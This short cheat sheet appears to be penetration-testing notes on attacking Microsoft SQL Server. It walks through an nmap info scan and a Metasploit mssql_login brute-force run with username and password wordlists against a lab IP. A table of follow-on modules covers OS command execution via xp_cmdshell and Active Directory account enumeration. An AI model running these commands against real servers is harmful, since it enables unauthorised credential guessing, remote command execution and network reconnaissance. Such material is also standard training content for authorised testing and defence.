## Microsoft SQL Server Enumeration & Brute Force

MSSQL runs on **TCP port 1433**. Full workflow from information gathering to domain enumeration.

---

## Nmap MSSQL Info

```bash
nmap 192.168.177.129 -p 1433 --script ms-sql-info
```

---

## Metasploit MSSQL Brute Force

```bash
msfconsole
```

```bash
use auxiliary/scanner/mssql/mssql_login
setg RHOSTS 192.168.177.129
set user_file /root/desktop/wordlists/common_users.txt
set pass_file /root/desktop/wordlists/100-common-passwords.txt
set STOP_ON_SUCCESS true
set VERBOSE false
run
```

| Option | Purpose |
|--------|---------|
| `setg` | Global variable — persists across modules |
| `user_file` | Username wordlist path |
| `pass_file` | Password wordlist path |
| `STOP_ON_SUCCESS` | Halt on first valid credential |
| `VERBOSE false` | Suppress attempt output |

## Module Reference

| Module | Purpose |
|--------|---------|
| `mssql_login` | Credential brute force |
| `mssql_enum` | Enumerate MSSQL configuration |
| `mssql_enum_sql_logins` | List SQL server logins |
| `mssql_exec` | Execute OS commands via xp_cmdshell |
| `mssql_enum_domain_accounts` | Enumerate Active Directory accounts |
